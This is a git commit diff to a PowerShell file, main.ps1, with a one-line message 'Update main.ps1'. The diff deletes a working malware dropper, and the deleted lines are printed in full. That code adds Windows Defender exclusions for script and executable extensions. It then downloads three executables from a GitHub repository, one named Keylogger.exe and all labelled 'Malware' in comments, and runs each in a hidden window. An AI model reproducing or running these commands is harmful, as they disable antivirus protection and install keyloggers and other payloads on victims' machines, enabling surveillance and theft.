259b8d63e52f01cac5afae68802791b72a9a2eb4
hackyitpro <ranahassan81086@gmail.com>
2025-07-19 08:07:11 -0700

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,21 +1,2 @@
-# Add exclusions to Windows Defender for specific file extensions
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".dll"
-powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
-
-
-#Malware 1
-powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/Client.exe -o C:\Users\Public\Client.exe
-powershell.exe -w Hidden C:\Users\Public\Client.exe
-
-#Malware 2
-powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/discord.exe -o C:\Users\Public\discord.exe
-powershell.exe -w Hidden C:\Users\Public\discord.exe
-
-#Malware 3
-powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/Keylogger.exe -o C:\Users\Public\keylogger.exe
-powershell.exe -w Hidden C:\Users\Public\keylogger.exe
-
 
 
